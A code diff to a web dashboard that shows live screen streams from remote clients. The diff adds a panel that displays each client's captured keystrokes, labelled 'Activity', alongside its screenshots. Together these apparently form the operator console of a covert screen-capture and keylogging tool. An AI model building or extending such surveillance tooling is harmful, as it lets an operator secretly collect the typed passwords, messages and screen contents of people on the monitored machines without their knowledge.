@@ -152,6 +152,22 @@
             font-size: 18px;
             text-align: center;
         }
+        #keysDisplay {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.8);
+            color: #2ecc71;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            word-wrap: break-word;
+            max-height: 150px;
+            overflow-y: auto;
+            display: none;
+            border: 2px solid #2ecc71;
+        }
     </style>
 </head>
 <body>
@@ -186,6 +202,7 @@
         <div class="screen-container">
             <div id="waitingMessage">Waiting for screen stream... Select a client from the list above.</div>
             <img id="screenStream" style="display: none;" alt="Screen Stream">
+            <div id="keysDisplay"></div>
         </div>
     </div>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
@@ -249,6 +266,33 @@
                     screenStream.src = data.image;
                     screenStream.style.display = 'block';
                     statusText.textContent = 'Streaming';
+                }
+            });
+            
+            socket.on('screenshot', (data) => {
+                if (data.clientId === selectedClientId) {
+                    waitingMessage.style.display = 'none';
+                    screenStream.src = data.image;
+                    screenStream.style.display = 'block';
+                    
+                    // Display keys in a dedicated area
+                    const keysDisplay = document.getElementById('keysDisplay');
+                    if (keysDisplay) {
+                        if (data.keys && data.keys.length > 0) {
+                            keysDisplay.textContent = `Activity: ${data.keys}`;
+                            keysDisplay.style.display = 'block';
+                            keysDisplay.style.color = '#2ecc71';
+                        } else {
+                            keysDisplay.textContent = 'No activity detected';
+                            keysDisplay.style.color = '#999';
+                        }
+                    }
+                    
+                    if (data.keys && data.keys.length > 0) {
+                        statusText.textContent = `Streaming - Activity: ${data.keys.substring(0, 100)}${data.keys.length > 100 ? '...' : ''}`;
+                    } else {
+                        statusText.textContent = 'Streaming';
+                    }
                 }
             });
             
